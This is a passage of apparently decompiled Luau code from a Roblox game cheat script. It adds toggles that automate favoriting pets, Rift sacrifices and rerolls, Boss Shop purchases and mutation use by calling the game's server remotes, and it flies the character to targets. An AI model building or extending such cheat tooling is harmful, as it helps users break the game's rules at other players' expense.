						if type(v33) == "table" and v33.IsFavorite == true then
							n24 += 1
						end
					end

					pcall(createText.Set, createText, string.format("Favorite matches  -  %d pets, %d to mark  |  %d favorited", v31, #v30, n24))
				end

				if flag4 or os.clock() < n23 then
					return false
				end

				if v29 and fn43(v30, true) then
					return false
				end

				if tbl4.Toggle(v24, false) then
					if fn43(fn41(v28, true, false), true) then
						return false
					end
				elseif tbl4.Toggle(v25, false) then
					fn43(fn41(v28, false, v29), false)
				end

				return false
			end)

			createText = v14.CreateText
			createText = createText(v14, { Name = "Favorite Preview", Text = "Favorite matches  -  0 pets" })

			v23 = v14:CreateToggle({
				Name = "Auto Favorite Pet",
				Note = "Favorite pets matching the rules below",
				Default = false,
				Callback = function()
					table.clear(tbl43)
					tbl3.Wake()
				end,
			})

			v14:CreateButton({
				Name = "Favorite Pets Now",
				Note = "Favorite matching pets once",
				ButtonText = "Favorite",
				ConfirmText = "Done!",
				SubOf = v23,
				Callback = function()
					local v28 = fn33()

					if v28 then
						fn43(fn40(v28), true)
					end
				end,
			})

			v14:CreateDropdown({
				Name = "Favorite Rule",
				Note = "Pass any check or all checks",
				Options = tbl34,
				Default = tbl34[2],
				SubOf = v23,
				Callback = function(arg)
					if table.find(tbl34, arg) then
						v26 = arg
						tbl3.Wake()
					end
				end,
			})

			v14:CreateDropdown({
				Name = "Favorite Min Rarity",
				Note = "Favorite pets of the chosen rarity and every rarity above it (Off = skip)",
				Options = tbl35,
				Default = "Off",
				SubOf = v23,
				Callback = function(arg)
					v27 = tbl36[arg]
					tbl3.Wake()
				end,
			})

			fn6(v14:CreateMultiDropdown({
				Name = "Favorite Mutations",
				Note = "Mutation check (empty = skip)",
				Options = tbl39,
				Default = {},
				SubOf = v23,
				Callback = function(arg)
					local tbl44 = {}
					local flag5 = false

					if type(arg) == "table" then
						for k, v28 in pairs(arg) do
							k = v28 == true and type(k) == "string" and k

							if k then
								v28 = k
							else
								v28 = type(v28) == "string" and v28
							end

							v28 = v28 or nil

							if v28 == str3 then
								flag5 = true
							elseif v28 then
								tbl44[tbl40[v28] or v28] = true
							end
						end
					end

					flag3 = flag5
					tbl41 = tbl44
					tbl3.Wake()
				end,
			}))

			local tbl44 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local n24 = 0
			local str4 = "M/s"

			local function fn44(arg, arg2)
				if arg ~= nil then
					n24 = math.max(0, math.floor(tonumber(arg) or n24))
				end

				if arg2 ~= nil then
					str4 = tostring(arg2)
				end

				n22 = n24 * (tbl44[str4] or tbl44["M/s"]).Mult
				tbl3.Wake()
			end

			fn5(v14, {
				Name = "Min Favorite Value",
				Note = "Value check (0 = skip)",
				SubOf = v23,
				Legacy = "Favorite Min Value",
				SectionName = "Auto Favorite",
				OnRaw = function(arg)
					fn44(math.floor(arg / 1000), "K/s")
				end,
			})

			fn6(v14:CreateMultiDropdown({
				Name = "Always Favorite Species",
				Note = "Always favorite these species",
				Options = tbl37,
				Default = {},
				SubOf = v23,
				Callback = function(arg)
					local tbl45 = {}

					if type(arg) == "table" then
						for k, v28 in pairs(arg) do
							local flag5 = v28 == true and type(k) == "string" and k or type(v28) == "string" and v28 or nil

							if flag5 and tbl38[flag5] then
								tbl45[tbl38[flag5]] = true
							end
						end
					end

					tbl42 = tbl45
					tbl3.Wake()
				end,
			}))

			v24 = v14:CreateToggle({
				Name = "Auto Favorite Equipped",
				Note = "Keep equipped pets favorited",
				Default = false,
				Callback = function()
					tbl3.Wake()
				end,
			})

			v25 = v14:CreateToggle({
				Name = "Auto Unfavorite Equipped",
				Note = "Unfavorite equipped pets not in the rules",
				Default = false,
				Callback = function()
					tbl3.Wake()
				end,
			})

			v14:CreateButton({
				Name = "Favorite Equipped Now",
				Note = "Favorite all equipped pets once",
				ButtonText = "Favorite",
				ConfirmText = "Done!",
				Callback = function()
					local v28 = fn33()

					if v28 then
						fn43(fn41(v28, true, false), true)
					end
				end,
			})

			v14:CreateButton({
				Name = "Unfavorite Equipped Now",
				Note = "Unfavorite all equipped pets once",
				ButtonText = "Unfavorite",
				ConfirmText = "Done!",
				Callback = function()
					local v28 = fn33()

					if v28 then
						fn43(fn41(v28, false, false), false)
					end
				end,
			})
		end
	end

	local n3, n4, tbl9, tbl10, n5, flag, n6, n7, str, tbl11
	local flag2, n8, fn8, fn9, fn10, fn11, fn12, tbl12, fn13, fn14
	local fn15, fn16, fn17, fn18, fn19, v8, v9, v10, tbl13, tbl14

	do
		local n9, tbl15, tbl16, tbl17, n10, tbl18, snapshot, str2, tbl19, n11
		local flag3, n12, n13, tbl20, v11, v12, v13, fn20, fn21, fn22
		local fn23, fn24, fn25, fn26, fn27, fn28, fn29

		do
			local save = tbl.Save

			if type(save) == "table" and type(save.FieldSignal) == "function" then
				for _, v14 in ipairs({ "Inventory", "EquippedAssets" }) do
					local ok, result = pcall(save.FieldSignal, v14)

					if ok and type(result) == "table" and type(result.Connect) == "function" then
						local ok2, result2 = pcall(result.Connect, result, function()
							tbl3.Wake()
						end)

						if ok2 and result2 then
							fn4(function()
								pcall(function()
									result2:Disconnect()
								end)
							end)
						end
					end
				end
			end

			local n14
			n14 = 5
			local v14, v15, flag4, n15, n16, n17, v16, n18, flag5, fn30
			local fn31, fn32, v17

			do
				local n19 = 5
				v14 = nil
				v15 = nil
				flag4 = false
				n15 = 0
				n16 = 0
				n17 = 0
				v16 = nil
				n18 = 0
				local str3 = ""
				flag5 = false

				local function fn33(arg, arg2)
					local v18 = networking:FindFirstChild(arg)
					if not v18 or not v18:IsA("RemoteFunction") then
						return false, nil, nil
					end

					if arg2 == nil then
						return pcall(v18.InvokeServer, v18)
					end
					return pcall(v18.InvokeServer, v18, arg2)
				end

				local function fn34()
					local save2 = tbl.Save
					if type(save2) ~= "table" or type(save2.Get) ~= "function" then
						return nil
					end
					local ok, result = pcall(save2.Get)
					return ok and type(result) == "table" and result or nil
				end

				local function fn35(arg)
					local directory = tbl.Assets and tbl.Assets.Directory
					local flag6 = type(directory) == "table" and directory[tostring(arg)] or nil
					return tostring(type(flag6) == "table" and flag6.DisplayName or arg)
				end

				fn30 = function(arg)
					if not arg and type(v16) == "table" and os.clock() < n17 then
						return v16
					end
					n17 = os.clock() + n19
					local AskState, v18 = fn33("RF/Rift/AskState")

					if AskState and type(v18) == "table" then
						v16 = v18
						n18 = os.clock()
					end

					return v16
				end

				local function fn36(arg, arg2)
					local requirements = type(arg) == "table" and arg.Requirements or nil
					if type(requirements) ~= "table" or #requirements == 0 then
						return nil, "No active recipe"
					end
					local tbl21 = {}

					if type(arg2.EquippedAssets) == "table" then
						for _, equippedAsset in pairs(arg2.EquippedAssets) do
							tbl21[equippedAsset] = true
						end
					end

					local tbl22 = {}

					for _, requirement in ipairs(requirements) do
						tbl22[tostring(requirement)] = {}
					end

					local v18 = pairs
					local inventory = arg2.Inventory or {}

					for k, v19 in v18(inventory) do
						local flag6 = type(v19) == "table" and tbl22[tostring(v19.Category)] or nil

						if flag6 and v19.InFuse ~= true and v19.IsFavorite ~= true and not tbl21[k] then
							local flag7 = type(v19.Mutations) == "table" and next(v19.Mutations) ~= nil
							table.insert(flag6, { Uid = k, Scale = tonumber(v19.Scale) or 0, Mutated = flag7 })
						end
					end

					for _, v19 in pairs(tbl22) do
						table.sort(v19, function(arg3, arg4)
							if arg3.Mutated ~= arg4.Mutated then
								return arg4.Mutated
							end
							return arg3.Scale < arg4.Scale
						end)
					end

					local tbl23 = {}
					local tbl24 = {}

					for _, requirement in ipairs(requirements) do
						local tbl25 = tbl22[tostring(requirement)]
						local v19 = ipairs
						tbl25 = tbl25 or {}
						local v20 = nil

						for _, v21 in v19(tbl25) do
							if not tbl24[v21.Uid] then
								v20 = v21
								break
							else
								v20 = nil
							end
						end

						if not v20 then
							return nil, "Missing " .. fn35(requirement)
						end
						tbl24[v20.Uid] = true
						table.insert(tbl23, v20.Uid)
					end

					return tbl23
				end

				fn31 = function()
					local v18 = v16
					if type(v18) ~= "table" then
						return "Rift status unknown"
					end

					if v18.Unlocked ~= true then
						return "Rift is locked on this account"
					end
					local tbl21 = {}
					local v19 = ipairs
					local requirements = v18.Requirements or {}

					for _, requirement in v19(requirements) do
						table.insert(tbl21, fn35(requirement))
					end

					local n20 = (tonumber(v18.SecondsUntilRotation) or 0) - os.clock() - n18

					if n20 < 0 then
						n20 = 0
					end

					local str4 = string.format("%s  -  needs %s  -  pity %s/%s  -  free rerolls %s  -  rotates in %d:%02d", tostring(v18.BannerDisplayName or v18.BannerId or "Rift"), #tbl21 > 0 and table.concat(tbl21, ", ") or "unknown", tostring(v18.PityCount or 0), tostring(v18.PityThreshold or 0), tostring(v18.FreeRefreshesRemaining or 0), math.floor(n20 / 60), math.floor(n20 % 60))

					if str3 ~= "" then
						str4 ..= "  -  " .. str3
					end

					return str4
				end

				fn32 = function(arg)
					local v18 = fn30(true)
					if type(v18) ~= "table" or v18.Unlocked ~= true then
						return
					end

					if v18.PendingReward ~= nil and v18.PendingReward ~= false then
						local AskFinishReveal, v19 = fn33("RF/Rift/AskFinishReveal")
						str3 = AskFinishReveal and v19 ~= false and "Reward claimed" or "Reward claim failed"
						n17 = 0
						return
					end

					local v19 = fn34()
					if not v19 then
						return
					end
					local v20, v21 = fn36(v18, v19)

					if not v20 then
						str3 = v21 or "Recipe not ready"
						local flag6 = arg == n15 and tbl4.Toggle(v15, false)

						if flag6 then
							flag6 = (tonumber(v18.FreeRefreshesRemaining) or 0) > 0
						end

						if flag6 then
							local AskRefresh, v22, v23 = fn33("RF/Rift/AskRefresh")

							if AskRefresh and v22 ~= false then
								str3 = "Recipe rerolled"
							else
								str3 = tostring(v23 or "Reroll rejected")
							end

							n17 = 0
						end

						return
					end

					if not tbl4.Toggle(v14, false) then
						str3 = "Ready to sacrifice"
						return
					end

					if arg ~= n15 then
						return
					end
					local AskTradeIn, v22, v23 = fn33("RF/Rift/AskTradeIn", v20)

					if AskTradeIn and v22 ~= false then
						str3 = "Sacrifice sent"
					else
						str3 = tostring(v23 or "Trade rejected")
					end

					n17 = 0
				end

				v17 = v7:CreateText({ Name = "Rift Machine Status", Text = "Loading Rift data..." })

				v14 = v7:CreateToggle({
					Name = "Auto Rift Sacrifice",
					Note = "Trade the 3 required pets into the Rift machine",
					Default = false,
					Callback = function()
						n15 += 1
						str3 = ""
						n16 = 0
						n17 = 0
						tbl3.Wake()
					end,
				})

				v15 = v7:CreateToggle({
					Name = "Auto Reroll Rift Recipe",
					Note = "Reroll the recipe when a pet is missing and free rerolls remain",
					Default = false,
					Callback = function()
						n15 += 1
						str3 = ""
						n16 = 0
						n17 = 0
						tbl3.Wake()
					end,
				})
			end

			for _, v18 in ipairs({
				{ Key = "Place", Name = "Place Rift Recipe Eggs" },
				{ Key = "Hatch", Name = "Hatch Rift Recipe Eggs" },
			}) do
				local key = v18.Key

				tbl4.Rift.Handles[key] = v7:CreateToggle({
					Name = v18.Name,
					Default = false,
					Callback = function()
						tbl4.Rift.Next = 0
						local v19 = tbl4.Rift.Restart[key]

						if type(v19) == "function" then
							v19()
						end

						tbl3.Wake()
					end,
				})
			end

			do
				local tbl21 = {
					{ Label = "Mutation Consumable", Id = "MutationConsumable", Price = 400 },
					{ Label = "2x Cash Booster", Id = "CashBooster", Price = 175 },
					{ Label = "2x Treadmill Booster", Id = "TreadmillBooster", Price = 200 },
					{ Label = "1.25x Speed", Id = "SpeedBoost", Price = 225 },
				}

				local tbl22 = {}

				for _, v18 in ipairs(tbl21) do
					tbl22[#tbl22 + 1] = v18.Label
				end

				local createToggle = nil
				local tbl23 = { ["Mutation Consumable"] = true }
				local n19 = 0
				local n20 = 0
				local BossMastery = nil

				pcall(function()
					BossMastery = require(ReplicatedStorage.Data.BossMastery)
				end)

				local function fn33(arg)
					if type(BossMastery) == "table" then
						local ok, result = pcall(BossMastery.GetShopPrice, arg.Id)
						if ok and type(result) == "number" and result > 0 then
							return result
						end

						if type(BossMastery.ShopProducts) == "table" then
							for _, shopProduct in ipairs(BossMastery.ShopProducts) do
								if shopProduct.Id == arg.Id and type(shopProduct.Price) == "number" then
									return shopProduct.Price
								end
							end
						end
					end

					return arg.Price
				end

				local function fn34()
					local playerGui = localPlayer and localPlayer:FindFirstChild("PlayerGui")
					playerGui = playerGui and playerGui:FindFirstChild("BossShop")
					if not playerGui then
						return nil
					end
					local amount = playerGui:FindFirstChild("Amount", true)
					if not amount or not amount:IsA("TextLabel") then
						return nil
					end
					local v18 = string.gsub(tostring(amount.Text), "[^%d]", "")
					if v18 == "" then
						return nil
					end
					return tonumber(v18)
				end

				local function fn35()
					local packages = ReplicatedStorage:FindFirstChild("Packages")
					packages = packages and packages:FindFirstChild("Networking")
					packages = packages and packages:FindFirstChild("RF/BossMastery/AskBuyShopItem")
					if packages and packages:IsA("RemoteFunction") then
						return packages
					end
					return nil
				end

				local function fn36(arg)
					local v18 = fn35()
					if not v18 then
						return false
					end

					local ok, result = pcall(function()
						return v18:InvokeServer(arg.Id)
					end)

					local flag6 = ok and result ~= false and result ~= nil

					if flag6 then
						tbl4.BossShopStock = (tonumber(tbl4.BossShopStock) or 0) + 1
					end

					return flag6
				end

				local function fn37(arg)
					local v18 = fn34()
					if v18 == nil then
						return
					end

					for _, v19 in ipairs(tbl21) do
						if arg ~= n20 then
							return
						end

						if tbl23[v19.Label] ~= true then
							continue
						end
						local v20 = fn33(v19)
						local n21 = 0

						while v18 ~= nil and v18 - v20 >= n19 and n21 < 25 do
							if arg ~= n20 or not tbl4.Toggle(createToggle, false) then
								return
							end

							if not fn36(v19) then
								break
							end
							n21 += 1
							task.wait(0.45)
							v18 = fn34()
						end
					end
				end

				local tbl24 = {
					Name = "Auto Buy Boss Shop",
					Note = "Spend Boss Tokens on the picked Boss Shop items",
					Default = false,
					Callback = function(arg)
						n20 += 1
						if arg ~= true then
							return
						end
						local v18 = n20

						task.spawn(function()
							while v18 == n20 and tbl4.Toggle(createToggle, false) do
								pcall(fn37, v18)

								for i = 1, 12 do
									if v18 ~= n20 then
										return
									end
									task.wait(0.5)
								end
							end
						end)
					end,
				}

				createToggle = v7.CreateToggle
				createToggle = createToggle(v7, tbl24)

				fn6(v7:CreateMultiDropdown({
					Name = "Boss Shop Items",
					Options = tbl22,
					Default = { "Mutation Consumable" },
					SubOf = createToggle,
					Callback = function(arg)
						local tbl25 = {}

						if type(arg) == "table" then
							for k, v18 in pairs(arg) do
								if v18 == true and type(k) == "string" then
									tbl25[k] = true
								elseif type(v18) == "string" then
									tbl25[v18] = true
								end
							end
						end

						tbl23 = tbl25
					end,
				}))

				v7:CreateSlider({
					Name = "Keep Boss Tokens",
					Note = "Stop buying once the balance would drop below this",
					Min = 0,
					Max = 20000,
					Default = 0,
					Increment = 50,
					Unit = "",
					SubOf = createToggle,
					Callback = function(arg)
						n19 = math.max(0, tonumber(arg) or 0)
					end,
				})

				fn4(function()
					n20 += 1
				end)
			end

			local tbl21
			tbl21 = { "Highest Value", "Best Rarity", "Biggest Size" }
			local v18
			v18 = nil
			local n19
			n19 = 0
			local n20
			n20 = 0
			local tbl22
			tbl22 = { Value = 0 }
			local str3
			str3 = tbl21[1]
			local flag6
			flag6 = true
			local tbl23
			tbl23 = {}
			local tbl24
			tbl24 = {}

			do
				local directory = tbl.Assets and tbl.Assets.Directory
				local tbl25 = {}

				if type(directory) == "table" then
					for k, v19 in pairs(directory) do
						local rarity = type(v19) == "table" and v19.Rarity or nil
						local flag7 = type(rarity) == "table"

						if flag7 then
							flag7 = tonumber(rarity.RarityNumber or rarity.Rank)
						end

						flag7 = flag7 or nil

						if flag7 then
							table.insert(tbl25, {
								Category = tostring(k),
								Name = tostring(v19.DisplayName or k),
								Rarity = flag7,
								RarityName = tostring(rarity.DisplayName or rarity._id or flag7),
							})
						end
					end
				end

				table.sort(tbl25, function(arg, arg2)
					if arg.Rarity ~= arg2.Rarity then
						return arg.Rarity > arg2.Rarity
					end
					return arg.Name < arg2.Name
				end)

				for _, v19 in ipairs(tbl25) do
					local str4 = string.format("%s [%s]", v19.Name, v19.RarityName)

					if tbl24[str4] then
						str4 = string.format("%s [%s] (%s)", v19.Name, v19.RarityName, v19.Category)
					end

					table.insert(tbl23, str4)
					tbl24[str4] = v19.Category
				end
			end

			local tbl25
			tbl25 = {}
			local str4, fn33, str5, str6, str7, str8, tbl26, v19, n21, n22
			local fn34

			do
				local n23 = 0
				str4 = "Idle"
				fn33 = nil
				str5 = "idle"
				str6 = "Turn it on to start applying Fractured"
				str7 = "#FFFFFF"
				str8 = ""
				tbl26 = {}
				v19 = nil
				n21 = 0
				n22 = 0
				fn34 = nil

				local function fn35(arg)
					local directory = tbl.Assets and tbl.Assets.Directory
					return type(directory) == "table" and directory[tostring(arg)] or nil
				end

				local function fn36(arg)
					local v20 = fn35(arg.AssetCategory)
					local rarity = type(v20) == "table" and v20.Rarity or nil
					local flag7 = type(rarity) == "table"

					if flag7 then
						flag7 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					return flag7 or 0
				end

				local function fn37(arg)
					local v20 = fn35(arg.AssetCategory)
					local n24 = type(v20) == "table" and tonumber(v20.EarningRate) or 0
					local n25 = tonumber(arg.AssetScale) or 0
					if n24 <= 0 or n25 <= 0 then
						return 0
					end
					return n24 * (n25 > 5 and (n25 / 5) ^ 1.2 * 19.637875755794113 or n25 ^ 1.85)
				end

				local function fn38(arg)
					if tostring(arg.BaseMutation or "") == "Boss" then
						return true
					end

					if type(arg.Mutations) == "table" then
						for k, mutation in pairs(arg.Mutations) do
							if type(mutation) == "string" and mutation == "Boss" then
								return true
							end

							if type(k) == "string" and k == "Boss" and mutation ~= false then
								return true
							end
						end
					end

					return false
				end

				local function fn39()
					local eggState = tbl.EggState
					if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
						return {}
					end
					local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
					if not ok or type(result) ~= "table" then
						return {}
					end
					local tbl27 = {}

					for k, v20 in pairs(result) do
						if type(v20) == "table" and v20.Placement ~= nil then
							v20.Uid = v20.Uid or k
							tbl27[#tbl27 + 1] = v20
						end
					end

					return tbl27
				end

				local n24 = 6

				local function fn40(arg)
					local uid = arg and arg.Uid

					if uid then
						local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
						areaEggSlotsClient = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(uid)

						if areaEggSlotsClient then
							local ok, result = pcall(function()
								return areaEggSlotsClient:GetPivot().Position
							end)

							if ok and typeof(result) == "Vector3" then
								return result
							end
						end
					end

					if type(tbl4.PenAnchor) == "function" then
						local ok, result = pcall(tbl4.PenAnchor)
						if ok and typeof(result) == "Vector3" then
							return result
						end
					end

					return nil
				end

				local function fn41(arg, arg2)
					local v20 = fn40(arg)
					if v20 == nil then
						return true
					end

					if tbl4.DistanceTo(v20) <= n24 then
						return true
					end

					local function fn42()
						if arg2 ~= n19 or not tbl4.Toggle(v18, false) then
							return true
						end
						return tbl4.Movement.PlaceWanted == true or tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true
					end

					if tbl4.Treadmill.Riding or tbl4.OnBelt() then
						tbl4.ExitBelt()
					end

					tbl4.HoldBelt()
					local ok, result = pcall(tbl4.FlyTo, v20 + Vector3.new(0, 3, 0), fn42, "fractured")
					tbl4.ReleaseBelt()
					tbl4.LeaveBelt()
					result = ok and result

					if result then
						local n25 = n24 + 4
						result = tbl4.DistanceTo(v20) <= n25
					end

					return result
				end

				local function fn42()
					local character = localPlayer.Character

					local function fn43(arg)
						if not arg or not arg:IsA("Tool") then
							return false
						end

						if tostring(arg:GetAttribute("ItemType")) ~= "MutationConsumable" then
							return false
						end
						local attribute = arg:GetAttribute("MutationId") or arg:GetAttribute("MutationTemplate")
						if attribute ~= nil then
							return tostring(attribute) == "Boss"
						end
						local v20 = string.lower(arg.Name)
						return string.find(v20, "mutation consumable", 1, true) ~= nil and string.find(v20, "scrambled", 1, true) == nil
					end

					if character then
						for _, child in ipairs(character:GetChildren()) do
							if fn43(child) then
								return child, true
							end
						end
					end

					local backpack = localPlayer:FindFirstChildOfClass("Backpack")

					if backpack then
						for _, child in ipairs(backpack:GetChildren()) do
							if fn43(child) then
								return child, false
							end
						end
					end

					return nil, false
				end

				local function fn43(arg)
					if not arg then
						return 0
					end
					local num = tonumber(arg:GetAttribute("Uses"))
					if num ~= nil then
						return num
					end
					local v20 = string.match(arg.Name, "%[X(%d+)%]")
					return tonumber(v20) or 1
				end

				local function fn44()
					local v20 = fn42()
					if not v20 then
						return nil, 0
					end
					local v21 = fn43(v20)
					if v21 <= 0 then
						return nil, 0
					end
					return v20, v21
				end

				local function fn45(arg)
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")
					if not character or not humanoid or not arg or arg.Parent == nil then
						return false
					end

					if arg.Parent ~= character then
						pcall(function()
							humanoid:EquipTool(arg)
						end)

						if arg.Parent ~= character then
							pcall(function()
								arg.Parent = character
							end)
						end

						task.wait(0.2)
					end

					return arg.Parent == character
				end

				local uid = nil

				local function fn46()
					local n25 = -1
					local v20 = nil

					for _, v21 in ipairs(fn39()) do
						local flag7 = true

						if flag6 then
							flag7 = fn38(v21)
						end

						local flag8 = false

						if flag7 then
							flag8 = true
						end

						if not flag8 and fn36(v21) < n20 then
							flag8 = true
						end

						local flag9 = not flag8 and tbl22.Value > 0
						local flag10

						if flag9 then
							local value = tbl22.Value
							flag10 = fn37(v21) < value
						else
							flag10 = flag9
						end

						if flag10 then
							flag8 = true
						end

						if not flag8 and next(tbl25) ~= nil and tbl25[tostring(v21.AssetCategory)] ~= true then
							flag8 = true
						end

						if not flag8 then
							local n26

							if str3 == tbl21[2] then
								n26 = fn36(v21) * 1000 + (tonumber(v21.AssetScale) or 0)
							elseif str3 == tbl21[3] then
								n26 = tonumber(v21.AssetScale) or 0
							else
								n26 = fn37(v21)
							end

							local flag11 = n26 > n25

							if not flag11 and v20 ~= nil and n26 == n25 and v21.Uid == uid then
								n25 = n26
								v20 = v21
							elseif flag11 then
								n25 = n26
								v20 = v21
							end
						end
					end

					return v20
				end

				local n25 = 0
				local n26 = 0

				local tbl27 = {
					Over = function(arg)
						if arg ~= n19 or not tbl4.Toggle(v18, false) then
							return true
						end
						return tbl4.Movement.PlaceWanted == true or tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true
					end,
					Apply = function(arg, arg2)
						if not fn45(arg2) then
							str5 = "work"
							str4 = "Could not hold the consumable"
							n23 = os.clock() + 2
							return false
						end

						local packages = ReplicatedStorage:FindFirstChild("Packages")
						packages = packages and packages:FindFirstChild("Networking")
						local rfBossMasteryAskUseMutationConsu = packages and packages:FindFirstChild("RF/BossMastery/AskUseMutationConsumable")

						if not rfBossMasteryAskUseMutationConsu or not rfBossMasteryAskUseMutationConsu:IsA("RemoteFunction") then
							str5 = "stop"
							str4 = "Mutation remote is missing"
							n23 = os.clock() + 10
							return false
						end

						str5 = "work"
						str4 = "Applying Fractured"
						n21 += 1

						local ok, result = pcall(function()
							return rfBossMasteryAskUseMutationConsu:InvokeServer(arg.Uid)
						end)

						if not ok or type(result) ~= "table" then
							n23 = os.clock() + 10
							return false
						end

						if result.Success == true then
							str4 = "Fractured applied"
							uid = nil
							str5 = "good"
							n22 += 1
							return true
						end

						local str9 = tostring(result.Message or "")
						local v20 = string.lower(str9)
						str4 = str9 ~= "" and str9 or "Try failed"
						str5 = "work"

						if string.find(v20, "not found") or string.find(v20, "invalid") then
							uid = nil
							n23 = os.clock() + 3
							return false
						end

						return true
					end,
					Settle = function()
						local n27 = os.clock() + 3

						while os.clock() < n27 do
							if tbl4.Grounded() then
								return
							end
							RunService.Heartbeat:Wait()
						end
					end,
				}

				local function fn47(arg)
					local n27 = tonumber(tbl4.BossShopStock) or 0

					if n27 ~= n25 then
						n25 = n27
						n23 = 0
					end

					if os.clock() < n23 then
						return
					end

					if tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true then
						str5 = "work"
						str4 = tbl4.Movement.ScrambleWanted == true and "Drone hunt goes first" or "Auto Steal goes first"
						n23 = os.clock() + 2
						return
					end

					local v20, v21 = fn44()

					if not v20 then
						str5 = "idle"
						str4 = "Need Mutation Consumable"
						n26 = 0
						str6 = ""
						str7 = "#C7CBD6"
						str8 = ""
						n23 = os.clock() + 5
						return
					end

					n26 = v21
					local v22 = fn46()

					if not v22 or not v22.Uid then
						str5 = "stop"
						str4 = "Waiting"

						if fn34 then
							fn34(nil)
						end

						return
					end

					if v22.Uid ~= uid then
						uid = v22.Uid
						str4 = "New target picked"
					end

					if fn34 then
						fn34(v22)
					end

					if tbl4.Movement.PlaceWanted == true then
						str5 = "work"
						str4 = "Auto Place goes first"
						n23 = os.clock() + 2
						return
					end

					if not tbl4.ClaimMovement("fractured") then
						str5 = "work"
						str4 = "Waiting for " .. tostring(tbl4.Movement.Owner or "movement")
						n23 = os.clock() + 2
						return
					end

					tbl4.Movement.FracturedWanted = true

					local ok, result = pcall(function()
						while not tbl27.Over(arg) do
							local v23, v24 = fn44()

							if v23 then
								n26 = v24
								local v25 = fn46()

								if not v25 or not v25.Uid then
									str5 = "stop"
									str4 = "Waiting"

									if fn34 then
										fn34(nil)
									end

									break
								else
									if v25.Uid ~= uid then
										uid = v25.Uid
										str4 = "New target picked"
									end

									if fn34 then
										fn34(v25)
									end

									if not fn41(v25, arg) then
										str5 = "work"
										str4 = "Could not reach the egg"
										n23 = os.clock() + 3
										break
									elseif not (tbl27.Over(arg) or not tbl27.Apply(v25, v23)) then
										pcall(fn33)
										task.wait(0.35)
										continue
									end
								end
							end

							break
						end
					end)

					if not ok then
						str4 = "Stopped: " .. tostring(result)
						str5 = "work"
						n23 = os.clock() + 3
					end

					tbl27.Settle()
					tbl4.Movement.FracturedWanted = false
					tbl4.ReleaseMovement("fractured")
				end

				v18 = v7:CreateToggle({
					Name = "Auto Use Fractured Mutation",
					Note = "Apply Fractured to your best placed egg, 10 percent per try",
					Default = false,
					Callback = function(arg)
						n19 += 1
						tbl4.Movement.FracturedWanted = false
						tbl4.ReleaseMovement("fractured")
						if arg ~= true then
							return
						end
						local v20 = n19

						task.spawn(function()
							while v20 == n19 and tbl4.Toggle(v18, false) do
								pcall(fn47, v20)
								pcall(fn33)
								task.wait(str5 == "idle" and 3 or 1)
							end
						end)
					end,
				})

				local tbl28 = { idle = "#8C93A6", work = "#FFC857", good = "#57E08A", stop = "#FF6B6B" }
				local v20 = nil
				local idle = tbl28.idle

				local function fn48(arg)
					if typeof(arg) ~= "Color3" then
						return "#FFFFFF"
					end
					local floor = math.floor
					local n27 = arg.B * 255 + 0.5
					return string.format("#%02X%02X%02X", math.floor(arg.R * 255 + 0.5), math.floor(arg.G * 255 + 0.5), floor(n27))
				end

				local function fn49(arg)
					local ok, result = pcall(Color3.fromHex, arg)
					if not ok or typeof(result) ~= "Color3" then
						return arg
					end
					local v21, v22, v23 = result:ToHSV()
					local max = math.max
					return fn48(Color3.fromHSV(v21, math.min(v22, 0.78), max(v23, 0.82)))
				end

				local function fn50(arg)
					local v21 = fn35(arg and arg.AssetCategory)
					local icon = type(v21) == "table" and v21.Icon or nil
					if icon == nil then
						return ""
					end

					if tonumber(icon) then
						return "rbxassetid://" .. tostring(icon)
					end
					return tostring(icon)
				end

				local function fn51(arg)
					local v21 = fn35(arg and arg.AssetCategory)
					local rarity = type(v21) == "table" and v21.Rarity or nil
					local flag7 = type(rarity) == "table"

					if flag7 then
						flag7 = tostring(rarity.DisplayName or rarity._id or "")
					end

					return flag7 or "", fn49(fn48(type(rarity) == "table" and rarity.Color or nil))
				end

				local function fn52(arg)
					if type(arg) ~= "table" then
						return "No egg selected"
					end
					local v21 = fn35(arg.AssetCategory)
					local flag7 = type(v21) == "table"

					if flag7 then
						flag7 = tostring(v21.DisplayName or arg.AssetCategory)
					end

					return flag7 or tostring(arg.AssetCategory)
				end

				fn33 = function()
					idle = tbl28[str5] or tbl28.idle

					if tbl26.Accent and type(tbl26.Accent.Set) == "function" then
						tbl26.Accent.Set({ Background = idle })
					end

					if tbl26.Title and type(tbl26.Title.Set) == "function" then
						tbl26.Title.Set({ Text = str4, Color = idle })
					end

					if tbl26.Egg and type(tbl26.Egg.Set) == "function" then
						tbl26.Egg.Set({ Text = str6, Color = str7 })
					end

					if tbl26.Meta and type(tbl26.Meta.Set) == "function" then
						tbl26.Meta.Set({ Text = string.format("Left %d   Tries %d   Applied %d", n26, n21, n22) })
					end

					if tbl26.Icon and type(tbl26.Icon.Set) == "function" then
						tbl26.Icon.Set({ Visible = str8 ~= "", Image = str8, StrokeColor = str7 })
					end

					if v19 and type(v19.Set) == "function" then
						pcall(v19.Set, v19, str4 .. "  -  " .. str6)
					end
				end

				fn34 = function(arg)
					if type(arg) ~= "table" then
						str6 = "No egg matches the filters"
						str7 = "#C7CBD6"
						str8 = ""
						return
					end

					local v21, v22 = fn51(arg)
					local n27 = tonumber(arg.AssetScale) or 0
					str6 = string.format("%s   %.2f kg", fn52(arg), n27)

					if v21 ~= "" then
						str6 ..= "   " .. string.upper(v21)
					end

					str7 = v22
					str8 = fn50(arg)
				end

				if type(v7.CreateCanvas) == "function" then
					local v21 = v7:CreateCanvas({
						Name = "Mutation Status",
						ShowTitle = false,
						Layout = "free",
						SubOf = v18,
						Style = {
							TextScale = 1,
							LineHeight = 1.1,
							MinLines = 4,
							MaxLines = 4,
							AutoHeight = true,
							BackgroundTransparency = 0.35,
							TextColor = Color3.fromRGB(255, 255, 255),
							TextStrokeTransparency = 0.7,
						},
